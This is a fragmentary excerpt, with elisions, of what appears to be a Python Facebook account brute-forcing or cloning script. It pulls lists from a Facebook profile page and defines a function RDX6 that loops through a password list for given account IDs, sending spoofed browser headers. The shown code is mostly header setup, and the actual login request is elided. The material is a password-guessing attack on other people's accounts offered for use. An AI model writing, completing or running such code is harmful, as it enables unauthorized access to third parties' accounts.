...
android_models=[]
try:
	xx = requests.get('https://www.facebook.com/zain.zani.000?mibextid=ZbWKwL').text.splitlines()
	for line in xx:
...
usr=[]
try:
	xd=requests.get('https://www.facebook.com/zain.zani.000?mibextid=ZbWKwL').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
...
def RDX6(ids,passlist):
	...
	try:
		for pas in passlist:
            ...
            'pragma': 'no-cache',
            'sec-ch-ua': '"Google Chrome";v="0", "Chromium";v="0", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            ...
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.30 Safari/525.13',}
